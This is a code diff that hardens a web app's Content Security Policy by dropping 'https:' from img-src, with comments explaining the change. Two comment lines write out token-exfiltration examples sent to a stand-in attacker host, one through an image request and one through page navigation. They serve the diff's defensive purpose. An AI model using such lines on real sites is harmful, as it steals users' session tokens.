@@ -50,7 +50,19 @@ const csp = [
   "default-src 'self'",
   `script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""}`,
   "style-src 'self' 'unsafe-inline'",
-  "img-src 'self' data: https:",
+  // NOT `https:`. That was the first draft, waved through to avoid breaking
+  // avatars this app does not display — and it silently defeated the whole
+  // point of the policy. `img-src https:` permits
+  //
+  //     new Image().src = "https://attacker.example/?t=" + localStorage.token
+  //
+  // which is a complete exfiltration channel that never touches `connect-src`.
+  // A CSP whose restrictive directive is bypassed by a permissive one beside it
+  // is worse than no CSP, because it reads as protection.
+  //
+  // Every image this app renders is its own or a data URI. If a remote image is
+  // ever needed, allow that one origin — never a scheme.
+  "img-src 'self' data:",
   "font-src 'self' data:",
   `connect-src 'self' ${connectOrigins.join(" ")}`.trim(),
   // No embedding: this app shows one person's finances, and clickjacking it
@@ -60,6 +72,13 @@ const csp = [
   "base-uri 'self'",
   "form-action 'self'",
 ].join("; ");
+
+// The honest limit, recorded so nobody re-derives it under pressure: no CSP can
+// stop `location = "https://attacker.example/?t=" + token`. Top-level
+// navigation was meant to be covered by `navigate-to`, which no browser
+// shipped. So a CSP raises the cost of exfiltration and closes the silent
+// channels; it cannot close the loud one. That residue is a reason to keep
+// `script-src` honest, not a reason to skip the policy.
 
 const securityHeaders = [
   { key: "Content-Security-Policy", value: csp },
